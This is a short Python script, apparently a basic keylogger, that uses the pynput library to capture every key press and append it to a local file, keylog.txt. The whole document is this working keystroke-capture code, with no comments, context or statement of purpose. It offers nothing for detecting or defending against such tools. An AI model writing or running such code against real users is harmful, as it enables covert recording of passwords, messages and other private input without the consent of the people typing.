from pynput.keyboard import Listener

def write_to_log(key):
    key = str(key).replace("'", "")
    if key == "Key.enter":
        key = '\n'
    with open("keylog.txt", "a") as f:
        f.write(key)

with Listener(on_press=write_to_log) as listener:
    listener.join()
